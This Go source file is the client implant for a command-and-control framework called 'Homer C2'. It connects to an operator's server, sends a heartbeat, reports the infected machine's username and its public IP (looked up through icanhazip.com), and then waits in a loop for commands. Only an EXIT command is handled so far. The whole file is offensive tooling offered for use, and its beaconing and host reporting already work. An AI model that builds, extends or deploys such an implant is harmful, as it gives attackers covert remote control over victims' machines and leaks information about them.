// Windows & Linux Connector Client for Homer C2

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os/user"
	"strings"
)

var ip string = "localhost" // your server/computers host ip
var port string = "8080"    // port of your server to connect to

type System struct {
	username string
	ip       string
	port     string
}

func main() {
	c := connectClient()

	info := System{
		username: getUsername(),
		ip:       getIP(),
		port:     port,
	}

	// more in depth information soon for analysis
	fmt.Fprintf(c, info.username+"\n")
	fmt.Fprintf(c, info.ip+"\n")
	fmt.Fprintf(c, info.port+"\n")

	for {
		command, _ := bufio.NewReader(c).ReadString('\n')
		command = strings.TrimSpace(string(command))

		if command == "EXIT" {
			c.Close()
		}
	}
}

func connectClient() (c net.Conn) {
	data := fmt.Sprintf("%s:%s", ip, port)
	c, err := net.Dial("tcp", data)
	if err != nil {
		return
	}
	fmt.Fprintf(c, "heartbeat\n")

	return c
}

func getUsername() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	return user.Username
}

func getIP() string {
	resp, err := http.Get("http://icanhazip.com/")
	if err != nil {
		return "None"
	}
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "None"
	}

	return string(ip)
}
